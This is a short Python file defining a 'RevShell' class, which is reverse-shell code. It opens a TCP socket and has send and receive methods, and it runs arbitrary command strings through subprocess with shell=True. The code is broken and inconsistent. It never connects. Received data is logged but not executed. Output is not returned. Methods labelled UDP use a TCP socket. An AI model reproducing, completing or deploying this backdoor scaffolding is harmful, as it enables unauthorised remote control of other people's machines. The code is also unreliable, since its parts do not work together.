import socket
import logging
import subprocess


class RevShell():
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.logger = logging.getLogger(__name__)


    def recieve_cmd_udp(self):
        """Receive data from the socket."""
        while True:
            try:
                data = self.sock.recv(1024)
                if not data:
                    break
                self.logger.info(f"Received data: {data.decode()}")
            except Exception as e:
                self.logger.error(f"Error receiving data: {e}")
                break

    def send_cmd_udp(self, cmd):
        """Send a command to the remote host."""
        try:
            self.sock.sendall(cmd.encode())
            self.logger.info(f"Sent command: {cmd}")
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")

    def execute_cmd(self, cmd):
        """Execute a command on the remote host."""
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if output:
                self.logger.info(f"Command output: {output.decode()}")
            if error:
                self.logger.error(f"Command error: {error.decode()}")
        except Exception as e:
            self.logger.error(f"Error executing command: {e}")